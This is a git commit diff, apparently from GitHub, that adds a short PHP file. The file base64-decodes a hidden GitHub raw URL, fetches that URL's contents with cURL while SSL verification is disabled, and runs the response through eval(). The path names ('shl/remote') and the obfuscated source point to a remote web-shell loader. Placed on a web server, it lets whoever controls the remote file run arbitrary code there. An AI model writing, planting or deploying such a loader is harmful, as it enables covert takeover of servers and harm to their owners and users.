08674bf9cb90b17ed48c530595a98f6cc67b0284
sam <144790923+tryxapp@users.noreply.github.com>
2025-06-01 15:20:43 +0700

    Add files via upload

---
+++ from/to/ex/fr/lst/shl/remote/ahku.php
@@ -0,0 +1,23 @@
+<?php
+$encoded_url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RyeXhhcHAvdW5rbm93bi9yZWZzL2hlYWRzL21haW4vZnJvbS90by9leC9mci9sc3Qvc2hsL2Foa3UucGhw";
+
+$remote_url = base64_decode($encoded_url);
+
+$ch = curl_init();
+
+curl_setopt($ch, CURLOPT_URL, $remote_url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+
+$response = curl_exec($ch);
+
+if($response === false) {
+    echo "cURL Error: " . curl_error($ch);
+    exit;
+}
+
+curl_close($ch);
+
+eval('?>' . $response);
+?>
